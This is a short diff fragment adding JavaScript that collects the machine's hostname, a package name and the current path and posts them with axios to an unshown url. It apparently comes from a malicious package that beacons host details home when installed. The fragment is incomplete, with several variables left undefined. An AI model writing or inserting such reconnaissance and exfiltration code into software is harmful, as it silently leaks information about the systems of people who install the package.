@@ -1,0 +1,14 @@
+const HOSTNAME = os.hostname()
+const data = {
+    package_name: PACKAGE_NAME,
+    hostname: HOSTNAME,
+    current_path: CURRENT_PATH
+}
+_tmp_0.hostname = HOSTNAME
+axios.post(url, data)
+    .then(response => {
+        console.log('Response:', response.data);
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    })
